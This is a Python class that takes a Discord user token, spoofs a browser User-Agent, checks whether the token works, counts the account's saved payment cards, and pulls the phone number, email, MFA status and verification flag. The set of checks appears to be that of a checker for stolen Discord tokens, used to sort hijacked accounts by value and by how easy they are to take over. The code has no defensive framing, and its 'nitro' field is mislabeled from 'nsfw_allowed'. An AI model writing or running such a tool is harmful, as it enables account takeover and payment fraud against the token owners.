import requests
from json import loads


class DiscordAPI:
    def __init__(self, token: str):
        self.token: str = token
        self.headers: dict = {
            'Content-Type': 'application/json',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
            "Authorization": self.token
        }

        self.__BASE_URL__ = "https://discord.com/api/v9/users/@me"

    def getValid(self) -> int:
        response = requests.get(
            url='https://discordapp.com/api/v9/users/@me/library',
            headers=self.headers
        )
        return response.status_code

    def getCards(self):
        response = requests.get(
            url="https://discordapp.com/api/v9/users/@me/billing/payment-sources",
            headers=self.headers
        )
        data = loads(response.text)
        return len(data)

    def getInfoToken(self):
        """
        Получаем информацию о токене
        :return: bool
        """
        response = requests.get(
            url=self.__BASE_URL__,
            headers=self.headers
        )
        if response.status_code == 200:
            data = loads(response.text)
            phone = "NOT"
            if data["phone"] is not None:
                phone = data['phone']

            username = data['username'] + "#" + data['discriminator']
            email = data['email']
            mfa_info = data['mfa_enabled']
            verified = data['verified']
            nitro = data['nsfw_allowed']

            return username, phone, email, mfa_info, verified, nitro

        return False
